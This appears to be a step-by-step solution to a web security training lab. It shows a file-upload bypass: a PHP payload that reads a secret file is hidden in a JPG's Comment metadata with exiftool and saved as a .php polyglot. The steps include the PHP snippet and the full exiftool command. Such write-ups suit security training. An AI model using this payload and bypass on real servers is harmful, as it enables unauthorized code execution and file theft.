## Solution steps

- Open Burp Suite and set up proxy (Keep the intercept off).
- Log in to your account using the given credentials and notice the option for uploading an avatar image.
- On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret. For example: `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images.
- Start Kali Linux and install exiftool if it's not already available on your system.
- Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata.
- Write the following command in the terminal: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php`
- This adds your PHP payload to the image's Comment field, then saves the image with a .php extension.
- In the browser, upload the polyglot image as your avatar, then go back to your account page.
- In Burp's proxy history, find the GET /files/avatars/polyglot.php request. Use the message editor's search feature to find the START string somewhere within the binary image data in the response. Between this and the END string, you should see Carlos's secret, for example: START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
- Submit the secret to solve the lab.
